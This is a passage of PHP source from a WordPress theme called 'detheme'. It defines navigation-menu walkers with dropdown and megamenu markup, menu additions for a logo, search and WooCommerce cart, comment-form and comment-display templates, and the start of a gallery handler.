<?php
defined('ABSPATH') or die();

function is_detheme_demo(){
  $demoDir=get_template_directory()."/demo/";

  if(@is_dir($demoDir) && !@is_file($demoDir)){
    locate_template('demo/demo.php',true);
  }

}

add_filter('nav_menu_link_attributes','formatMenuAttibute',2,2);
function mainNavFilter($items) {
  foreach ($items as $item) {
      if (hasSub($item->ID, $items)) {
        $item->classes[] = 'dropdown'; 
      }
  }
    return $items;        
}

function formatMenuAttibute($atts, $item){

  global $dropdownmenu;

  if(is_array($item->classes) && in_array('dropdown', $item->classes)){
    $atts['class']="dropdown-toggle";
    $atts['data-toggle']="dropdown";
    $dropdownmenu=$item;
  }
  return $atts;

}
function hasSub($menu_item_id, $items) {
      foreach ($items as $item) {
        if ($item->menu_item_parent && $item->menu_item_parent==$menu_item_id) {
          return true;
        }
      }
      return false;
}


function createFontelloIconMenu($css,$item,$args=array()){

  $args=is_array($args)?(object)$args:$args;

  $css=@implode(" ",$css);
  $args->link_before="";
  $args->link_after="";
  
  if(preg_match('/icon-([a-z-0-9]{0,})/', $css, $matches)){
  
    $css=preg_replace('/'.$matches[0].'/', "", $css);
    $item->title="<i class=\"".$matches[0]."\"></i>";
  }
  return @explode(" ",$css);
}


function createFontelloMenu($css,$item,$args=array()){

  $args=is_array($args)?(object)$args:$args;


  $css=@implode(" ",$css);
  $args->link_before="";
  $args->link_after="";
  
  if(preg_match('/icon-([a-z-0-9]{0,})/', $css, $matches)){
  
    $css=preg_replace('/'.$matches[0].'/', "", $css);
    $args->link_before.="<i class=\"".$matches[0]."\"></i>";
  }

  $args->link_before.="<span>";
  $args->link_after="</span>";

  return @explode(" ",$css);
}

add_filter( 'nav_menu_css_class', 'createFontelloMenu', 10, 3 );
add_filter( 'nav_menu_icon_css_class', 'createFontelloIconMenu', 10, 3 );


class dt_iconmenu_walker extends Walker_Nav_Menu {

  function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
    $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

    $class_names = $value = '';

    $classes = empty( $item->classes ) ? array() : (array) $item->classes;
    $classes[] = 'menu-item-' . $item->ID;

    /**
     * Filter the CSS class(es) applied to a menu item's <li>.
     *
     * @since 3.0.0
     *
     * @param array  $classes The CSS classes that are applied to the menu item's <li>.
     * @param object $item    The current menu item.
     * @param array  $args    An array of arguments. @see wp_nav_menu()
     */
    $class_names = join( ' ', apply_filters('nav_menu_icon_css_class',array_filter( $classes ), $item, $args));
    $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';


    /**
     * Filter the ID applied to a menu item's <li>.
     *
     * @since 3.0.1
     *
     * @param string The ID that is applied to the menu item's <li>.
     * @param object $item The current menu item.
     * @param array $args An array of arguments. @see wp_nav_menu()
     */
    $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
    $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

    $output .= $indent . '<li' . $id . $value . $class_names .'>';

    $atts = array();
    $atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
    $atts['target'] = ! empty( $item->target )     ? $item->target     : '';
    $atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
    $atts['href']   = ! empty( $item->url )        ? $item->url        : '';

    /**
     * Filter the HTML attributes applied to a menu item's <a>.
     *
     * @since 3.6.0
     *
     * @param array $atts {
     *     The HTML attributes applied to the menu item's <a>, empty strings are ignored.
     *
     *     @type string $title  The title attribute.
     *     @type string $target The target attribute.
     *     @type string $rel    The rel attribute.
     *     @type string $href   The href attribute.
     * }
     * @param object $item The current menu item.
     * @param array  $args An array of arguments. @see wp_nav_menu()
     */
    $atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );

    $attributes = '';
    foreach ( $atts as $attr => $value ) {
      if ( ! empty( $value ) ) {
        $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
        $attributes .= ' ' . $attr . '="' . $value . '"';
      }
    }

    $item_output = $args->before;
    $item_output .= '<a'. $attributes .'>';
    $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
    $item_output .= '</a>';
    $item_output .= $args->after;

    /**
     * Filter a menu item's starting output.
     *
     * The menu item's starting output only includes $args->before, the opening <a>,
     * the menu item's title, the closing </a>, and $args->after. Currently, there is
     * no filter for modifying the opening and closing <li> for a menu item.
     *
     * @since 3.0.0
     *
     * @param string $item_output The menu item's starting HTML output.
     * @param object $item        Menu item data object.
     * @param int    $depth       Depth of menu item. Used for padding.
     * @param array  $args        An array of arguments. @see wp_nav_menu()
     */
    $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
  }    
}


class dt_mainmenu_walker extends Walker_Nav_Menu {

  protected $megamenu_parent_ids = array();
  private $curItem;

  function start_lvl( &$output, $depth = 0, $args = array() ) {
      $tem_output = $output . 'akhir';

      $found = preg_match_all('/<li (.*)<span>(.*?)<\/span><\/a>akhir/s', $tem_output, $matches);

      $foundid = preg_match_all('/<li id="menu\-item\-(.*?)"/s', $tem_output, $ids);

      $found_full_megamenu = preg_match_all('/class="(.*)dt\-megamenu(.*?)"/s', $tem_output, $full_megamenu);

      if ($found) {
        $menu_title = $matches[count($matches)-1][0];

        if (count($ids[1])>0) {
          $menu_id = $ids[1][count($ids[1])-1];
        } else {
          $menu_id = rand (1000,9999);
        }
        $class_sub = "";

        $output .= '<label for="fof'.$menu_id.'" class="toggle-sub" onclick="">&rsaquo;</label>
        <input id="fof'.$menu_id.'" class="sub-nav-check" type="checkbox">
        <ul id="fof-sub-'.$menu_id.'" class="sub-nav '. $class_sub .'"><li class="sub-heading">'. $menu_title .' <label for="fof'.$menu_id.'" class="toggle" onclick="" title="'.__('Back','detheme').'">&lsaquo; '.__('Back','detheme').'</label></li>';

      }
  }

  function end_lvl( &$output, $depth = 0, $args = array() ) {
    if ( is_plugin_active('dt-megamenu/dt-megamenu.php') ) {
      if (isset($this->curItem)) {
        if ($this->curItem->megamenuType=='megamenu-column') {
          $output .= '</div></li><!--end of <li><div class="row">-->';// end of <li><div class="row">
          $output .= '<!--end_lvl1 '.$this->curItem->ID.' '. $this->curItem->megamenuType . ' -->';
          parent::end_lvl($output,$depth,$args);
        } else {
          $output .= '<!--end_lvl2 '.$this->curItem->ID.' '. $this->curItem->megamenuType . ' -->';
          parent::end_lvl($output,$depth,$args);
        }
      } else {
        $output .= '<!--end_lvl3-->';
        parent::end_lvl($output,$depth,$args);
      }
    } else {
      $output .= '<!--end_lvl4-->';
      parent::end_lvl($output,$depth,$args);
    }
  }

  function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
    if(is_array($args) && $args['fallback_cb']=='wp_page_menu'){

      $item->title=$item->post_title;
      $item->url=get_permalink($item->ID);
    }

    if ( is_plugin_active('dt-megamenu/dt-megamenu.php') ) {

      switch($item->megamenuType) {
        case 'megamenu-column':

          $classes = implode(" ",$item->classes);

          $output .= '<div class="'.$classes.' dt-megamenu-grid">';
          $output .= '  <ul class="dt-megamenu-sub-nav">';
        break;
        case 'megamenu-heading':
          parent::start_el($output,$item,$depth,$args,$id);
        break;
        case 'megamenu-content':
          parent::start_el($output,$item,$depth,$args,$id);
        break;
        default :
          parent::start_el($output,$item,$depth,(object)$args,$id);
        break;
      }

      if (is_array($item->classes) && in_array('dt-megamenu',$item->classes)) {
        $class_sub = "megamenu-sub";
        $style_sub = "";

        if ( is_plugin_active('dt-megamenu/dt-megamenu.php') ) {
          if (isset($item->megamenuWidthOptions)) {
            if ($item->megamenuWidthOptions=='dt-megamenu-width-set sticky-left') {
              if (!empty($item->megamenuWidth)) {
                $style_sub = ' style="width: '. $item->megamenuWidth .';"';
              }
            } else {
              $class_sub = "megamenu-sub ". $item->megamenuWidthOptions;
            }
          }
        }

        //$class_sub = "megamenu-sub auto-dt-megamenu";

        $background_style = '';
        if (isset($item->megamenuBackgroundURL)) {
          $background_style = 'style="background: url('.$item->megamenuBackgroundURL.') '. $item->megamenuBackgroundHorizontalPosition . ' ' . $item->megamenuBackgroundVerticalPosition . ' ' . $item->megamenuBackgroundRepeat . ';"';
        }

        //print_r('trace');
        //print_r($background_style);

        $menu_id = $item->ID;
        $this->megamenu_parent_ids[] = $menu_id;

        $menu_title = $item->post_title;

        $output .= '<label for="fof'.$menu_id.'" class="toggle-sub" onclick="">&rsaquo;</label>
        <input id="fof'.$menu_id.'" class="sub-nav-check" type="checkbox">
        <ul id="fof-sub-'.$menu_id.'" class="sub-nav '. $class_sub .'"'.$style_sub.'><li class="sub-heading">'. $menu_title .' <label for="fof'.$menu_id.'" class="toggle" onclick="" title="'.__('Back','detheme').'">&lsaquo; '.__('Back','detheme').'</label></li>';

        $output .= '<li><div class="row" '.$background_style.'>';
      }

    } else {
      parent::start_el($output,$item,$depth,(object)$args,$id);
    }
    
  }

  function end_el( &$output, $item, $depth = 0, $args = array() ) {
    $this->curItem = $item;

    if ( is_plugin_active('dt-megamenu/dt-megamenu.php') ) {
      switch($item->megamenuType) {
        case 'megamenu-column':
          $output .= '</div><!--end_el megamenu-column-->';
        break;
        case 'megamenu-heading':
          parent::end_el($output,$item,$depth,$args);
        break;
        case 'megamenu-content':
          parent::end_el($output,$item,$depth,$args);
        break;
        default :
          parent::end_el($output,$item,$depth,$args);
        break;
      }
    } else {

      parent::end_el($output,$item,$depth,$args);
    }
  }

}


class dt_topbarmenuright_walker extends Walker_Nav_Menu {
  function start_lvl( &$output, $depth = 0, $args = array() ) {
      $tem_output = $output . 'akhir';

      $found = preg_match_all('/<li (.*)<span>(.*?)<\/span><\/a>akhir/s', $tem_output, $matches);

      $foundid = preg_match_all('/<li id="menu\-item\-(.*?)"/s', $tem_output, $ids);

      if ($found) {
        $menu_title = $matches[count($matches)-1][0];

        if (count($ids[1])>0) {
          $menu_id = $ids[1][count($ids[1])-1];
        } else {
          $menu_id = rand (1000,9999);
        }


        //print_r($matches[count($matches)-1] . ' aha');
        $output .= '<label for="topright'.$menu_id.'" class="toggle-sub" onclick="">&rsaquo;</label>
        <input id="topright'.$menu_id.'" class="sub-nav-check" type="checkbox">
        <ul id="topright-sub-'.$menu_id.'" class="sub-nav"><li class="sub-heading">'. $menu_title .' <label for="topright'.$menu_id.'" class="toggle" onclick="" title="'.__('Back','detheme').'">&lsaquo; '.__('Back','detheme').'</label></li>';
      }
  }

}

class dt_topbarmenuleft_walker extends Walker_Nav_Menu {
  function start_lvl( &$output, $depth = 0, $args = array() ) {
      $tem_output = $output . 'akhir';

      $found = preg_match_all('/<li (.*)<span>(.*?)<\/span><\/a>akhir/s', $tem_output, $matches);

      $foundid = preg_match_all('/<li id="menu\-item\-(.*?)"/s', $tem_output, $ids);

      if ($found) {
        $menu_title = $matches[count($matches)-1][0];

        if (count($ids[1])>0) {
          $menu_id = $ids[1][count($ids[1])-1];
        } else {
          $menu_id = rand (1000,9999);
        }


        //print_r($matches[count($matches)-1] . ' aha');
        $output .= '<label for="topleft'.$menu_id.'" class="toggle-sub" onclick="">&rsaquo;</label>
        <input id="topleft'.$menu_id.'" class="sub-nav-check" type="checkbox">
        <ul id="topleft-sub-'.$menu_id.'" class="sub-nav"><li class="sub-heading">'. $menu_title .' <label for="topleft'.$menu_id.'" class="toggle" onclick="" title="'.esc_attr(__('Back','detheme')).'">&lsaquo; '.__('Back','detheme').'</label></li>';
      }
  }

}

add_filter( 'wp_nav_menu_items','add_search_box_to_menu', 10, 2 );
function add_search_box_to_menu( $items, $args ) {
    global $detheme_config;

    $logo = $detheme_config['dt-logo-image']['url'];
    $logo_transparent = $detheme_config['dt-logo-image-transparent']['url'];

    $logoContent="";

    if(!empty($logo)){
      $logoContent='<a href="'.home_url().'" style=""><img id="logomenu" src="'.esc_url(maybe_ssl_url($logo)).'" alt="'.(!empty($detheme_config['dt-logo-text'])?$detheme_config['dt-logo-text']:"").'" class="img-responsive halfsize" '.(($detheme_config['logo-width'])?" width=\"".(int)$detheme_config['logo-width']."\"":"").'></a>';
      $logoContent.='<a href="'.home_url().'" style=""><img id="logomenureveal" src="'.esc_url(maybe_ssl_url($logo_transparent)).'" alt="'.(!empty($detheme_config['dt-logo-text'])?$detheme_config['dt-logo-text']:"").'" class="img-responsive halfsize" '.(($detheme_config['logo-width'])?" width=\"".(int)$detheme_config['logo-width']."\"":"").'></a>';
    } else{
      $logoContent=(!empty($detheme_config['dt-logo-text']))?'<div class="header-logo><a class="navbar-brand-desktop" href="'.home_url().'">'.$detheme_config['dt-logo-text'].'</a></div>':"";
    }

    $items = '<li class="logo-desktop hidden-sm hidden-xs">'.$logoContent.'</li>' . $items;

    if($detheme_config['show-header-searchmenu']):
      if( $args->theme_location == 'primary' ) :
        $items .= '<li class="menu-item menu-item-type-search"><form class="searchform" id="menusearchform" method="get" action="' . home_url( '/' ) . '" role="search">
                <a class="search_btn"><i class="icon-search-6"></i></a>
                <div class="popup_form"><input type="text" class="form-control" id="sm" name="s" placeholder="'.__('Search','detheme').'"></div>
              </form></li>';
      endif;
    endif;

    if($detheme_config['show-header-shoppingcart']):
      if( $args->theme_location == 'primary' ) :
        if ( is_plugin_active('woocommerce/woocommerce.php') ) :

          if ( function_exists('WC') && sizeof( WC()->cart->get_cart() ) > 0 ) :
            $items .= '<li id="menu-item-999999" class="hidden-mobile bag menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-999999">
                      <a href="#">
                        <span><i class="icon-cart"></i><span class="item_count">'. WC()->cart->get_cart_contents_count() . '</span></span>
                      </a>
                        
                      <label for="fof999999" class="toggle-sub" onclick="">&rsaquo;</label>
                      <input id="fof999999" class="sub-nav-check" type="checkbox">
                      <ul id="fof-sub-999999" class="sub-nav">
                        <li class="sub-heading">'.__('Shopping Cart','detheme').' <label for="fof999999" class="toggle" onclick="" title="'.esc_attr(__('Back','detheme')).'">&lsaquo; '.__('Back','detheme').'</label></li>
                        <li>
                          <!-- popup -->
                          <div class="cart-popup"><div class="widget_shopping_cart_content"></div></div>  
                          <!-- end popup -->
                        </li>
                      </ul>

                    </li>';
          else:
              $items .= '<li id="menu-item-999999" class="hidden-mobile bag menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-999999">
                        <a href="#">
                          <span><i class="icon-cart"></i> <span class="item_count">0</span></span>
                        </a>
    
                        <label for="fof999999" class="toggle-sub" onclick="">&rsaquo;</label>
                        <input id="fof999999" class="sub-nav-check" type="checkbox">
                        <ul id="fof-sub-999999" class="sub-nav">
                          <li class="sub-heading">'.__('Shopping Cart','detheme').' <label for="fof999999" class="toggle" onclick="" title="'.esc_attr(__('Back','detheme')).'">&lsaquo; '.__('Back','detheme').'</label></li>
                          <li>
                            <!-- popup -->
                            <div class="cart-popup"><div class="widget_shopping_cart_content"></div></div>  
                            <!-- end popup -->
                          </li>
                        </ul>

                      </li>';
          endif; //if ( function_exists('WC') && sizeof( WC()->cart->get_cart() ) > 0 )
        endif; //if ( is_plugin_active('woocommerce/woocommerce.php') )

      endif; //if( $args->theme_location == 'primary' )

    endif; //if($detheme_config['show-header-shoppingcart']):


    return $items;
}

add_filter( 'wp_nav_menu','add_custom_elemen_to_menu', 10, 2 );
function add_custom_elemen_to_menu( $nav_menu, $args ) {
  $found = preg_match_all('/<div id=\"dt\-menu\" class=\"([a-zA-Z0-9_-]+)\">(.*?)<\/ul><\/div>/s',$nav_menu,$menucontent);
  if ($found) {
    $nav_menu = '<div id="dt-menu" class="'.$menucontent[1][0].'"><label for="main-nav-check" class="toggle" onclick="" title="'.esc_attr(__('Close','detheme')).'"><i class="icon-cancel-1"></i></label>'.$menucontent[2][0].'</ul><label class="toggle close-all" onclick="uncheckboxes(&#39;nav&#39;)"><i class="icon-cancel-1"></i></label>
      </div>';
  }

  return $nav_menu;
}

add_filter( 'wp_nav_menu','add_custom_elemen_to_topbarmenuright', 11, 2 );
function add_custom_elemen_to_topbarmenuright( $nav_menu, $args ) {
  $found = preg_match_all('/<div id=\"dt\-topbar\-menu\-right\" class=\"([a-zA-Z0-9_-]+)\">(.*?)<\/ul><\/div>/s',$nav_menu,$menucontent);
  if ($found) {
    $nav_menu = '<div id="dt-topbar-menu-right" class="'.$menucontent[1][0].'"><label for="main-nav-check" class="toggle" onclick="" title="'.esc_attr(__('Close','detheme')).'"><i class="icon-cancel-1"></i></label>'.$menucontent[2][0].'</ul><label class="toggle close-all" onclick="uncheckboxes(&#39;nav-top-right&#39;)"><i class="icon-cancel-1"></i></label></div>';
  }

  return $nav_menu;
}

add_filter( 'wp_nav_menu','add_custom_elemen_to_topbarmenuleft', 12, 2 );
function add_custom_elemen_to_topbarmenuleft( $nav_menu, $args ) {
  $found = preg_match_all('/<div id=\"dt\-topbar\-menu\-left\" class=\"([a-zA-Z0-9_-]+)\">(.*?)<\/ul><\/div>/s',$nav_menu,$menucontent);
  if ($found) {
    $nav_menu = '<div id="dt-topbar-menu-left" class="'.$menucontent[1][0].'"><label for="main-nav-check" class="toggle" onclick="" title="'.esc_attr(__('Close','detheme')).'"><i class="icon-cancel-1"></i></label>'.$menucontent[2][0].'</ul><label class="toggle close-all" onclick="uncheckboxes(&#39;nav-top-left&#39;)"><i class="icon-cancel-1"></i></label></div>';
  }

  return $nav_menu;
}

function add_class_to_first_submenu($items) {
  $menuhaschild = array();

  foreach($items as $key => $item) {

    if (in_array('menu-item-has-children',$item->classes)) {
      $menuhaschild[] = $item->ID;
    }

  }

  foreach($menuhaschild as $key => $parent_id) {
    foreach($items as $key => $item) {
      if ($item->menu_item_parent==$parent_id) {
        $item->classes[] = 'menu-item-first-child';
        break;
      }
    }
  }


  return $items;
}
add_filter('wp_nav_menu_objects', 'add_class_to_first_submenu');

function dt_page_menu( $args = array() ) {

  $defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu','container_class'=>'','container'=>'div', 'echo' => true, 'link_before' => '', 'link_after' => '');
  $args = wp_parse_args( $args, $defaults );
  $args = apply_filters( 'wp_page_menu_args', $args );
  $menu = '';
  $list_args = $args;



  // Show Home in the menu
  if ( ! empty($args['show_home']) ) {
    if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
      $text = __('Home','detheme');
    else
      $text = $args['show_home'];
    $class = '';
    if ( is_front_page() && !is_paged() )
      $class = 'class="current_page_item"';
    $menu .= '<li ' . $class . '><a href="' . home_url( '/' ) . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
    // If the front page is a page, add it to the exclude list

    if (get_option('show_on_front') == 'page') {
      if ( !empty( $list_args['exclude'] ) ) {
        $list_args['exclude'] .= ',';
      } else {
        $list_args['exclude'] = '';
      }
      $list_args['exclude'] .= get_option('page_on_front');
    }
  }



   $list_args['echo'] = false;
  $list_args['title_li'] = '';

  $menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );



  if ( $menu )

    $menu = '<ul class="' . esc_attr($args['menu_class']) . '">' . $menu . '</ul>';



  $menu = '<'.esc_attr($args['container']).' class="' . esc_attr($args['container_class']) . '">' . $menu . "</".esc_attr($args['container']).">\n";

  $menu = apply_filters( 'wp_page_menu', $menu, $args );

  if ( $args['echo'] )

    echo $menu;

  else

    return $menu;

}

function dt_tag_cloud_args($args=array()){

  $args['filter']=1;
  return $args;

}



function dt_tag_cloud($return="",$tags, $args = '' ){

 if(!count($tags))
    return $return;
  $return='<ul class="list-unstyled">';
  foreach ($tags as $tag) {
    $return.='<li class="tag"><a href="'.esc_url($tag->link).'">'.ucwords($tag->name).'</a></li>';
  }
  $return.='</ul>';
  return $return;

}



function dt_widget_title($title="",$instance=array(),$id=null){
  if(empty($instance['title']))
      return "";
  return $title;
}


add_filter('widget_tag_cloud_args','dt_tag_cloud_args');
add_filter('wp_generate_tag_cloud','dt_tag_cloud',1,3);
add_filter('widget_title','dt_widget_title',1,3);

if(!function_exists('get_avatar_url')){
  function get_avatar_url($author_id,$args=array()){

        $get_avatar=get_avatar( $author_id, $args);

        preg_match("/src='(.*?)'/i", $get_avatar, $matches);
        if (isset($matches[1])) {
          return $matches[1];
        } else {
          return;
        }
  }

}

// Comment Functions

function dt_comment_form( $args = array(), $post_id = null ) {
  if ( null === $post_id )
    $post_id = get_the_ID();
  else
    $id = $post_id;

  $commenter = wp_get_current_commenter();
  $user = wp_get_current_user();
  $user_identity = $user->exists() ? $user->display_name : '';

  $args = wp_parse_args( $args );
  if ( ! isset( $args['format'] ) )
    $args['format'] = current_theme_supports( 'html5', 'comment-form' ) ? 'html5' : 'xhtml';

  $req      = get_option( 'require_name_email' );
  $aria_req = ( $req ? " aria-required='true'" : '' );
  $html5    = 'html5' === $args['format'];
  
  $fields   =  array(
    'author' => '<div class="row">
                    <div class="form-group col-xs-12 col-sm-4">
                      <i class="icon-user-7"></i>
                      <input type="text" class="form-control" name="author" id="author" placeholder="'.esc_attr(__('full name','detheme')).'" required>
                  </div>',
    'email' => '<div class="form-group col-xs-12 col-sm-4">
                      <i class="icon-mail-7"></i>
                      <input type="email" class="form-control"  name="email" id="email" placeholder="'.esc_attr(__('email address','detheme')).'" required>
                  </div>',
    'url' => '<div class="form-group col-xs-12 col-sm-4">
                  <i class="icon-globe-6"></i>
                  <input type="text" class="form-control icon-user-7" name="url" id="url" placeholder="'.esc_attr(__('website','detheme')).'">
                </div>
              </div>',
  );

  $required_text = sprintf( ' ' . __('Required fields are marked %s','detheme'), '<span class="required">*</span>' );
  $defaults = array(
    'fields'               => apply_filters( 'comment_form_default_fields', $fields ),
    'comment_field'        => '<div class="row">
                                  <div class="form-group col-xs-12">
                                    <textarea class="form-control" rows="3" name="comment" id="comment" placeholder="'.esc_attr(__('your message','detheme')).'" required></textarea>

                                  </div>
                              </div>',
    'must_log_in'          => '<p class="must-log-in">' . sprintf( __( 'You must be <a href="%s">logged in</a> to post a comment.','detheme' ), wp_login_url( apply_filters( 'the_permalink', get_permalink( $post_id ) ) ) ) . '</p>',
    'logged_in_as'         => '<p class="logged-in-as">' . sprintf( __( 'Logged in as <a href="%1$s">%2$s</a>. <a href="%3$s" title="Log out of this account">Log out?</a>','detheme' ), get_edit_user_link(), $user_identity, wp_logout_url( apply_filters( 'the_permalink', get_permalink( $post_id ) ) ) ) . '</p>',
    'comment_notes_before' => '<p class="comment-notes">' . __( 'Your email address will not be published.','detheme' ) . ( $req ? $required_text : '' ) . '</p>',
    'comment_notes_after'  => '',
    'id_form'              => 'commentform',
    'id_submit'            => 'submit',
    'title_reply'          => '<div class="comment-leave-title">'.__('Leave a Comment','detheme').'</div>',
    'title_reply_to'       => __( 'Leave a Comment to %s','detheme' ),
    'cancel_reply_link'    => __( 'Cancel reply','detheme' ),
    'label_submit'         => __( 'Submit','detheme' ),
    'format'               => 'html5',
  );

  $args = wp_parse_args( $args, apply_filters( 'comment_form_defaults', $defaults ) );

  ?>
    <?php if ( comments_open( $post_id ) ) : ?>

      <?php do_action( 'comment_form_before' ); ?>
      <section id="respond" class="comment-respond">
        <h3 id="reply-title" class="comment-reply-title"><?php comment_form_title( $args['title_reply'], $args['title_reply_to'] ); ?> <small><?php cancel_comment_reply_link( $args['cancel_reply_link'] ); ?></small></h3>
        <?php if ( get_option( 'comment_registration' ) && !is_user_logged_in() ) : ?>
          <?php echo $args['must_log_in']; ?>
          <?php do_action( 'comment_form_must_log_in_after' ); ?>
        <?php else : ?>
          <form action="<?php echo site_url( '/wp-comments-post.php' ); ?>" method="post" id="<?php echo esc_attr( $args['id_form'] ); ?>" class="comment-form"<?php echo $html5 ? ' novalidate' : ''; ?> data-abide>
            <?php do_action( 'comment_form_top' ); ?>
            <?php 
              if ( is_user_logged_in() ) :
                echo apply_filters( 'comment_form_logged_in', $args['logged_in_as'], $commenter, $user_identity );
                do_action( 'comment_form_logged_in_after', $commenter, $user_identity );
                echo $args['comment_notes_before'];
              else : 
                do_action( 'comment_form_before_fields' );
                foreach ( (array) $args['fields'] as $name => $field ) {
                  echo apply_filters( "comment_form_field_{$name}", $field ) . "\n";
                }
                do_action( 'comment_form_after_fields' );
              endif; 
            ?>
            <?php echo apply_filters( 'comment_form_field_comment', $args['comment_field'] ); ?>
            <?php echo $args['comment_notes_after']; ?>
            <p class="form-submit">
              <input name="submit" type="submit" id="<?php echo esc_attr( $args['id_submit'] ); ?>" value="<?php echo esc_attr( $args['label_submit'] ); ?>" class="secondary_color_button btn" />
              <?php comment_id_fields( $post_id ); ?>
            </p>
            <?php do_action( 'comment_form', $post_id ); ?>
          </form>
        <?php endif; ?>
      </section><!-- #respond -->
      <?php do_action( 'comment_form_after' ); ?>
    <?php else : ?>
      <?php do_action( 'comment_form_comments_closed' ); ?>
    <?php endif; ?>
  <?php
}

/**
 * Retrieve HTML content for reply to comment link.
 *
 * The default arguments that can be override are 'add_below', 'respond_id',
 * 'reply_text', 'login_text', and 'depth'. The 'login_text' argument will be
 * used, if the user must log in or register first before posting a comment. The
 * 'reply_text' will be used, if they can post a reply. The 'add_below' and
 * 'respond_id' arguments are for the JavaScript moveAddCommentForm() function
 * parameters.
 *
 * @since 2.7.0
 *
 * @param array $args Optional. Override default options.
 * @param int $comment Optional. Comment being replied to.
 * @param int $post Optional. Post that the comment is going to be displayed on.
 * @return string|bool|null Link to show comment form, if successful. False, if comments are closed.
 */
function dt_get_comment_reply_link($args = array(), $comment = null, $post = null) {
  global $user_ID;

  $defaults = array('add_below' => 'comment', 'respond_id' => 'respond', 'reply_text' => __('Reply','detheme'),
    'login_text' => __('Log in to Reply','detheme'), 'depth' => 0, 'before' => '', 'after' => '');

  $args = wp_parse_args($args, $defaults);

  if ( 0 == $args['depth'] || $args['max_depth'] <= $args['depth'] )
    return;

  extract($args, EXTR_SKIP);

  $comment = get_comment($comment);
  if ( empty($post) )
    $post = $comment->comment_post_ID;
  $post = get_post($post);

  if ( !comments_open($post->ID) )
    return false;

  $link = '';

  if ( get_option('comment_registration') && !$user_ID )
    $link = '<a rel="nofollow" class="comment-reply-login" href="' . esc_url( wp_login_url( get_permalink() ) ) . '">' . $login_text . '</a>';
  else 
    $link = "<a class='reply comment-reply-link primary_color_button btn' href='#' onclick='return addComment.moveForm(\"$add_below-$comment->comment_ID\", \"$comment->comment_ID\", \"$respond_id\", \"$post->ID\")'>$reply_text</a>";
  
  //var_dump($args);
  return apply_filters('comment_reply_link', $before . $link . $after, $args, $comment, $post);
  //var_dump(apply_filters('comment_reply_link', $args, $comment, $post));
  //return apply_filters('comment_reply_link', $args, $comment, $post);
}

/**
 * Displays the HTML content for reply to comment link.
 *
 * @since 2.7.0
 * @see dt_get_comment_reply_link() Echoes result
 *
 * @param array $args Optional. Override default options.
 * @param int $comment Optional. Comment being replied to.
 * @param int $post Optional. Post that the comment is going to be displayed on.
 * @return string|bool|null Link to show comment form, if successful. False, if comments are closed.
 */
function dt_comment_reply_link($args = array(), $comment = null, $post = null) {
  echo dt_get_comment_reply_link($args, $comment, $post);
}

/**
 * Display or retrieve edit comment link with formatting.
 *
 * @since 1.0.0
 *
 * @param string $link Optional. Anchor text.
 * @param string $before Optional. Display before edit link.
 * @param string $after Optional. Display after edit link.
 * @return string|null HTML content, if $echo is set to false.
 */
if ( ! function_exists( 'dt_edit_comment_link' ) ) :
  function dt_edit_comment_link( $link = null, $before = '', $after = '' ) {
    global $comment;

    if ( !current_user_can( 'edit_comment', $comment->comment_ID ) )
      return;

    if ( null === $link )
      $link = __('Edit This','detheme');

    $link = '<a class="comment-edit-link primary_color_button btn" href="' . get_edit_comment_link( $comment->comment_ID ) . '">' . $link . '</a>';
    echo $before . apply_filters( 'edit_comment_link', $link, $comment->comment_ID ) . $after;
  }
endif; 

if ( ! function_exists( 'dt_comment' ) ) :
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own dt_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since Loopa 1.0
 */
function dt_comment( $comment, $args, $depth ) {

  $GLOBALS['comment'] = $comment;
  switch ( $comment->comment_type ) :
    case 'pingback' :
    case 'trackback' :
      // Display trackbacks differently than normal comments.
      ?>
      <li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
      <p><?php _e( 'Pingback:', 'detheme' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'detheme' ), '<span class="edit-link">', '</span>' ); ?></p></li>
      <?php
    break;
  
    default :
      // Proceed with normal comments.

      ?>
              <div class="dt-reply-line"></div>
              <li class="comment_item media" id="comment-<?php print $comment->comment_ID; ?>">
                <div class="pull-left text-center">
                  <?php $avatar_url = get_avatar_url($comment,array('size'=>100)); ?>
                  <a href="<?php comment_author_url(); ?>"><img src="<?php echo esc_url($avatar_url); ?>" class="author-avatar img-responsive" alt="<?php comment_author(); ?>"></a>
                  <?php dt_comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'detheme' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
                  <?php dt_edit_comment_link( __( 'Edit', 'detheme' ), '', '' ); ?>
                </div>
                <div class="media-body">
                  <div class="col-xs-12 col-sm-5 dt-comment-author"><?php comment_author(); ?></div>
                  <div class="col-xs-12 col-sm-7 dt-comment-date secondary_color_text text-right"><?php comment_date('g:i A - j F, Y') ?></div>
                  <div class="col-xs-12 dt-comment-comment"><?php comment_text(); ?></div>
                </div>
              </li>

      <?php
    break;
  endswitch; // end comment_type check
}
endif; 


function detheme_gallery($out,$attr=array()) {
  global $detheme_config,$dt_revealData;
  $post = get_post();

  if( 'port'==$post->post_type)
      return '<!-- gallery -->';

  static $instance = 0;
  $instance++;

  if ( ! empty( $attr['ids'] ) ) {
    // 'ids' is explicitly ordered, unless you specify otherwise.
    if ( empty( $attr['orderby'] ) )
      $attr['orderby'] = 'post__in';
